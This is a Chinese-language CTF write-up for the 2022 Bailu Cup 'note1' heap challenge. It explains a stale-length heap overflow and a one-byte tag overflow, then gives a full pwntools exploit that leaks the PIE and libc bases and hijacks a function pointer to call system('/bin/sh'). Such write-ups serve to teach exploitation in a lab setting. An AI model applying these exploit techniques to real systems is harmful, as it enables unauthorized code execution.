---
title: 2022柏鹭杯note1
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
---
2022柏鹭杯note1，主要是对堆溢出的利用。
<!-- more -->
一道菜单堆题，查壳后发现保护全开。

结构体如下：

```c
struct note
{
    QWORD tag;
    int func(int);
    char* name;
    QWORD name_length;
}

```

具有new、edit、func三个功能，仅允许有2个chunk。

new功能就是note=malloc(0x20)，然后输入各项数据，对\x00也有注意（fgets会自动在最后一个字节变为\x00），没有什么可以利用的地方，需要注意的是name=malloc(n+1)，会多申请一点来放\x00。

edit功能分为edit_name,edit_tag,edit_func。

edit_name中如果新的name_length与原来的name_length不一样，就会free原来的name，malloc一个新的chunk写入name。**问题是在这里并没有把新的name_length写到note的对应位置中，下次edit时仍以原来的name作为标准**。因此如果开始时设置name_length较大，后面edit一个较小的name时就可以实现一个**堆溢出**。

edit_tag会修改tag，与new不同的是，这里用的是scanf("%8s")，因此**可以写9字节（最后一字节为\x00）**，写完后会覆盖一位func的地址，不过调用edit就可以改回去了，泄露func的地址，减去偏移可以得到textbase。

edit_func就是调用函数修改函数指针，没有可以利用的地方，不同的func只是保存地址不同，功能完全一样。

func功能执行

```c
(*(void (__fastcall **)(_QWORD))(chunk_list[id_call] + 8LL))(chunk_list[id_call]);

int __fastcall fun1(__int64 a1)
{
  puts("--------fun1--------");
  printf("tag: %s\n", (const char *)a1);
  printf("name: %s\n", *(const char **)(a1 + 16));
  return puts("--------------------");
}
```

输出tag和name，可以利用堆溢出修改name位置的指针来泄露libc。

exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
elf=ELF("./note3")
libc=ELF("./libc.so.6") #BaiLucup use 2.31 9.9
#use 2.31 9.7 to debug in local
p=process("./note3")

def add(Id, length, name, tag, func):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("id: ")
	p.sendline(str(Id))
	p.recvuntil("name_length: ")
	p.sendline(str(length))
	p.recvuntil("name: ")
	p.sendline(name)
	p.recvuntil("tag: ")
	p.sendline(tag)
	p.recvuntil("func: ")
	p.sendline(str(func))

def edit_name(Id, length, name):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("id: ")
	p.sendline(str(Id))
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("name_length: ")
	p.sendline(str(length))
	p.recvuntil("name: ")
	p.sendline(name)

def edit_tag(Id, tag):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("id: ")
	p.sendline(str(Id))
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("new tag: ")
	p.sendline(tag)

def edit_func(Id, func):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("id: ")
	p.sendline(str(Id))
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("func: ")
	p.sendline(str(func))

def funcall(Id):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("id: ")
	p.sendline(str(Id))

def debug():
    gdb.attach(p)
    pause()

#一开始把num_length设大，方便后面溢出
add(0,0x200,'a'*0x1ee,'ccccddd',1)
#通过edit_name把chunk改小，由此可以溢出
edit_name(0,0x10,'aaaabbbb')
add(1,0x20,'eeeeffff','bbbbbbb',2)


#leak textbase

edit_tag(0,'a'*0x8)
#edit_tag后func字段的最低位会被'\x00'覆盖，因此调用edit_func去把func字段改好
edit_func(0,2)
funcall(0)
p.recvline()
p.recvuntil('a'*0x8)
#泄露出func2的地址
data=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
#减去func2的偏移即可得到textbase
textbase=data-0x137A
print("[*]textbase: {:}".format(hex(textbase)))

#leak libcbase
#因为开了PIE，不要忘了加上textbase，将name字段覆盖为got表中puts表项，输出puts的真实地址
#顺便把num_length字段写了是因为edit会在后面追加'\x0a\x00'怕出问题
payload='a'*0x10+'\x00'*0x8+p64(0x31)+'a'*0x7+'\x00'+p64(textbase+0x137A)+p64(textbase+elf.got['puts'])+p64(9)
edit_name(0,0x1ef,payload)

funcall(1)
# data=p.recv()
# print(data)
p.recvline()
p.recvline()
p.recvuntil('name: ')
data=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
libcbase=data-libc.sym['puts']
#print("[*]data: {:}".format(hex(data)))
print("[*]libcbase: {:}".format(hex(libcbase)))
debug()
#get shell
payload='a'*0x10+'\x00'*0x8+p64(0x31)+'/bin/sh\x00'+p64(libcbase+libc.sym['system'])+p64(textbase+elf.got['puts'])+p64(9)
edit_name(0,0x1ef,payload)

funcall(1)

p.interactive()

```